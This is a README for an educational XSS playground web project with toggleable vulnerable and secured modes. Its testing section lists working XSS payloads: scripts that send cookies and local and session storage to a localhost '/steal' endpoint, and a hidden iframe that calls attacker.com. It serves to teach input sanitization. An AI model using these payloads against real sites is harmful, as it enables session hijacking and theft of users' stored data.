# JavaScript XSS Playground

This project demonstrates what XSS (Cross-site Scripting) is and how to prevent it using input sanitization. It is designed for educational purposes to help developers understand the risks of XSS attacks and the importance of secure coding practices.
<br></br>
<br></br>

**- testing the 1st tested payload**

![testing the 1st tested payload](https://imgur.com/TqDvpzu.png)
<br></br>

**- entering payloads in SECURED mode**

![entering payloads in SECURED mode](https://imgur.com/QNSfU2r.png)
<br></br>

**- after running server.js; enter the tested payload 4 and 5 into the text field**

![after running server.js; enter the tested payload 4 and 5 into the text field](https://imgur.com/UMWvQz3.png)
<br></br>

**- after entering see the stolen data from server.js console**

![after entering see the stolen data from server.js console](https://imgur.com/E4OOnXG.png)
<br></br>
<br></br>

## Features

- **Vulnerable Mode**: Simulates a working XSS vulnerability to demonstrate how attacks occur.
- **Secured Mode**: Shows how input sanitization can effectively prevent XSS attacks.
- **Toggle**: Easily switch between "Vulnerable" and "Secured" modes to compare behaviors.

## Concepts Learned

- Understanding XSS attacks and their impact.
- Implementing input validation and sanitization techniques.
- Recognizing the importance of secure coding practices.

## How to Use

1. Open `index.html` in a browser.
2. Enter some text in the input field and submit.
3. Toggle between "Vulnerable" and "Secured" modes to observe the difference in behavior.

## Testing the Project

1. Open `index.html` in a browser.
2. Use the following payloads in the input field to test XSS vulnerabilities:
   - `<img src="x" onerror="alert('XSS Attack!')">`
   - `<script>document.body.innerHTML = '<h1>Hacked by Attacker</h1>';</script>`
   - `<a href="https://www.youtube.com/" target="_blank">Click here</a>`
   - `<script>const img = document.createElement('img'); img.src = 'http://localhost:3000/steal?session=' + document.cookie; document.body.appendChild(img);</script>`
   - `<script>const data = { localStorage: JSON.stringify(localStorage), sessionStorage: JSON.stringify(sessionStorage) }; fetch('http://localhost:3000/steal', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) });</script>`
   - `<iframe src="http://attacker.com/steal-session" style="display:none;"></iframe>`
   - `<div id="target" onmouseover="alert('XSS via Event Listener')">Hover over me</div>`

3. Toggle between "Vulnerable" and "Secured" modes to observe how the application handles these payloads.

## Educational Purpose

This project is designed to educate developers about the risks of XSS attacks and the importance of input validation and sanitization. It provides hands-on experience with real-world attack scenarios and demonstrates effective prevention techniques.

## Disclaimer

This project is for educational purposes only. Do not use the vulnerable mode in a production environment. Always validate and sanitize user input to prevent malicious scripts from being executed.
